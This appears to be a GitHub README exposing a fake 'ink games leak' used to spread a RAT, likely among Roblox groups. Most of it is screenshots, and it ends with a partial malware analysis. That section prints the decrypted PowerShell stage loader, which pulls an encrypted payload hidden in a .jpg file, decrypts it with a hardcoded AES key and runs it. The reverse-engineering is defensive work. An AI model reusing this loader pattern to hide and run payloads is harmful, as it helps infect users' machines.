# Exposing the "ink games leak" 

These dudes really aren't smart

## AI slop readme
<img width="910" height="791" alt="image" src="https://github.com/user-attachments/assets/96266bfa-572b-4223-ab39-ba75919b6720" />


## SLN rat 💀
<img width="1231" height="378" alt="image" src="https://github.com/user-attachments/assets/8ab730aa-0fed-424e-a0ef-078d24182367" />
<img width="854" height="237" alt="image" src="https://github.com/user-attachments/assets/2a2c6580-0818-4e8e-91bf-fd868b67b31d" />
<img width="1287" height="932" alt="image" src="https://github.com/user-attachments/assets/a3ef3fd3-9a11-4b77-917f-5f032a320103" />

## the guys who did it
<img width="723" height="599" alt="image" src="https://github.com/user-attachments/assets/2f5f10d1-958a-4f7e-896c-7feca7c4e1a9" />
<img width="481" height="451" alt="image" src="https://github.com/user-attachments/assets/9c8c866a-9c1e-4c08-b35b-a936eb1c2d2b" />
<img width="510" height="463" alt="image" src="https://github.com/user-attachments/assets/922e47ef-8326-495e-a621-c2e46d4136ab" />

## they also hacked other roblox groups
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/36e22d7b-97b5-44f9-aa7c-23493a060185" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/2a19867d-ce4a-4055-a148-a0eb56ed1f30" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/cb20bef5-8dd4-4837-b26a-4f3b523c90fd" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/4328d4d5-169b-4805-9254-0eabbd04fe47" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/b9adfcb7-b5aa-4aef-9b80-e363aa7bf220" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/93df375d-f7fe-43af-b93b-de34c7bc3886" />


## more proof
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/73b1802c-71d5-474f-941b-3fc867654a30" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/cbf0eb69-25c0-488d-a9d1-a9c1444ae778" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/22995528-1fef-4c83-ac86-96d893749021" />
<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/128f24b0-b8b1-4bc4-a2a5-7a7f580641a5" />


credits to swr_1 for help on discord

# in progress of reversing the shit malware
stage one of malware is a bat file with a bunch of junk and encrypted functions
<img width="1194" height="572" alt="image" src="https://github.com/user-attachments/assets/c99dd926-dcfc-4fa3-9b0a-9a3580155369" />
the main things we actually want tho are the last lines of the batch script which are encrypted powershell commands
<img width="1777" height="122" alt="image" src="https://github.com/user-attachments/assets/17e8b789-d453-4f9e-8c52-3c0632e42dce" />

once we decrypt everything the powershell is actually really simple
```powershell
$mL='lODZdCk.jpg'
$nV=[IO.File]::ReadAllText($mL)
$nV=(($nV -split '\\+\\+\\+\\+A',2)[0]).Trim()
$o3=[Convert]::FromBase64String('81bMJPoAuf6ove+7O+ikD3Z39s/veVPzMvhHg2cZV7g=')
$oH=[Convert]::FromBase64String($nV)
$Nq=$oH[0..15]
$iW=$oH[16..($oH.Length-1)]
$LD=[Security.Cryptography.Aes]::Create()
$LD.Mode=[Security.Cryptography.CipherMode]::CBC
$LD.Padding=[Security.Cryptography.PaddingMode]::PKCS7
$LD.Key=$o3
$LD.IV=$Nq
$e1=[Text.Encoding]::UTF8.GetString($LD.CreateDecryptor().TransformFinalBlock($iW,0,$iW.Length))
$LD.Dispose()
$null=[scriptblock]::Create($e1).InvokeReturnAsIs()
```
